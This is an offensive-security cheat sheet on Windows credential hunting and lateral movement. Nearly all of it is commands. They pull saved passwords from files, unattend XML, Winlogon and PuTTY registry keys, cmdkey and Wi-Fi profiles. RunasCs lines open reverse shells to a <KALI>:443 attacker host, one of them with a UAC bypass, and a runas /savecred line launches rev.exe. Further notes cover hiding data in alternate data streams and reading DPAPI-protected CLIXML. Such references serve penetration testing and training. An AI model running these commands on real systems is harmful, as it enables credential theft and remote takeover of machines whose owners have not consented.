# Windows credential checks

## Credential hunting
```cmd
findstr /si password *.txt *.ini *.config *.xml
type C:\Windows\Panther\Unattend.xml
type C:\Windows\system32\sysprep\*.xml
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
cmdkey /list
netsh wlan show profile name=<SSID> key=clear
```
- Winlogon `DefaultPassword` = autologon creds. PuTTY sessions = saved proxy/host.
- SAM / LSA / LSASS → [credential-access](credential-access.md).

## Run as another user (have creds)
`runas` needs a password prompt (and Secondary Logon service): awkward from a reverse shell. RunasCs takes the password on the command line and redirects I/O.

```powershell
.\RunasCs.exe <USER> <PW> "cmd /c whoami"
.\RunasCs.exe <USER> <PW> cmd.exe -r <KALI>:443
.\RunasCs.exe <USER> <PW> cmd.exe -d <DOMAIN.TLD> -r <KALI>:443
.\RunasCs.exe <USER> <PW> cmd.exe --bypass-uac -r <KALI>:443
# PowerShell-only host (nothing on disk):
Invoke-RunasCs <USER> <PW> "cmd /c whoami" -Domain <DOMAIN.TLD>
```
```cmd
runas /savecred /user:<USER> C:\rev.exe
```
- `--bypass-uac`: only if `<USER>` is a local admin with a filtered token.
- `-l 9` = `NewCredentials` (like `runas /netonly`): outbound creds only, local `whoami` is unchanged; test against a remote resource.
- Other `-l` logon types differ in policy and UAC behavior.
- Alternate data streams: `dir /R`, `more < file:stream`, `type ... > file:hidden`.

## Existing CLIXML / DPAPI material
```powershell
$Stored = Import-Clixml -LiteralPath '<FILE>.xml'
$Stored.UserName
```
- Works only as the same user on the same machine that exported it (DPAPI).
- Browser/vault/credential files need the DPAPI masterkey/context → [credential stores](credential-stores.md) (KeePass, browsers, WinSCP, VNC, Sticky Notes, WSL).
